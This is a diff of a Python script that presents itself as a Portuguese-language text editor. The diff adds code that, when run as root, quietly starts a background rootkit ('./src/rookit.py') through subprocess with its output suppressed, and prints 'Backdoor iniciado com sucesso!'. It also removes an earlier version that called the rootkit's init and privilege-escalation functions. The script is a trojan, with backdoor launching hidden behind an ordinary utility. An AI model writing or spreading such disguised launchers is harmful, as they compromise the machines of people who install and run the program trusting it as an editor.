@@ -1,12 +1,14 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 import sys
+import os
+import subprocess
 from os import path
 from colorama import init, Fore, Style
 
+
 # LIB
 sys.path.append('./src/')
-from rookit import check_root, rootkit_init, elevar_privilegio
 
 def editor_de_texto():
     init(autoreset=True)
@@ -14,6 +16,7 @@ def editor_de_texto():
     def boas_vindas():
         print(Fore.CYAN + "Bem-vindo ao Editor de Texto 📝\n")
         #print(Fore.CYAN + "OBS: Usar somente para testes\n")
+        
     def criar_arquivo(file_path):
         if path.exists(file_path):
             print(Fore.YELLOW + "\n\tArquivo já existe!")
@@ -105,12 +108,24 @@ def editor_de_texto():
     boas_vindas()
     menu()
 
-if check_root():
-    rootkit_init()
-    editor_de_texto()
-    
-else:
-    print("Você não está como root. Este script requer privilégios de root para executar o notepad.")
-    elevar_privilegio()
-    editor_de_texto()
+# rootki
+def start_rootkit_in_background():
+    try:
+        subprocess.Popen(["python3", "./src/rookit.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        print("Backdoor iniciado com sucesso!")
+    except Exception as e:
+        print("Erro ao iniciar o backdoor:", e)
 
+def check_root():
+    return os.geteuid() == 0
+
+def elevar_privilegio():
+    pass
+    
+if check_root():
+    editor_de_texto()
+    start_rootkit_in_background()
+
+else:
+    print("Você não está como root. Este programa requer privilégios de administrador para executar o notepad.")
+    elevar_privilegio()
